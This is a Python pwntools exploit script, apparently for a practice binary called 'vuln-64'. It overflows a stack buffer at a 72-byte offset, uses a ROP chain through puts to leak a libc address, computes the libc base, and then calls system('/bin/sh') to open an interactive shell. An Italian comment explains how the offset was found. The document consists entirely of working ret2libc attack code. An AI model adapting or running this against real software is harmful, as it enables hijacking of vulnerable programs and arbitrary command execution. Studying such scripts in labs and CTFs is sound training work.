from pwn import *

elf = context.binary = ELF("./vuln-64")
libc = elf.libc
rop = ROP(elf)

p = process()

PUTS_GOT = elf.got["puts"]
PUTS_PLT = elf.plt["puts"]
POP_RDI = rop.rdi.address
MAIN = elf.symbols["main"]
SYSTEM_OFFSET = libc.symbols["system"]
PUTS_OFFSET = libc.symbols["puts"]
BINSH_OFFSET = next(libc.search(b"/bin/sh"))
RET = rop.ret.address

######################### leak libc ############################

exploit = b""
exploit += p64(POP_RDI)
exploit += p64(PUTS_GOT)
exploit += p64(PUTS_PLT)
exploit += p64(MAIN)

# p.sendline(b"A"*96 + b"B"*8 + b"C"*8)
p.sendline(
    b"A" * 72 + exploit
)  # 72 è l'offset, si trova con pattern create 200, invii per fare buf overflow, poi pattern search $rsp

print(p.recvline())

leak = u64(p.recvline().strip().ljust(8, b"\x00"))
print(hex(leak))
libc_base = leak - PUTS_OFFSET

print("leaked libc address: ", hex(libc_base))

######################### get shell ##############################

exploit = b""
exploit += p64(POP_RDI)
exploit += p64(libc_base + BINSH_OFFSET)
exploit += p64(RET)
exploit += p64(libc_base + SYSTEM_OFFSET)

p.send(b"A" * 72 + exploit)

p.interactive()
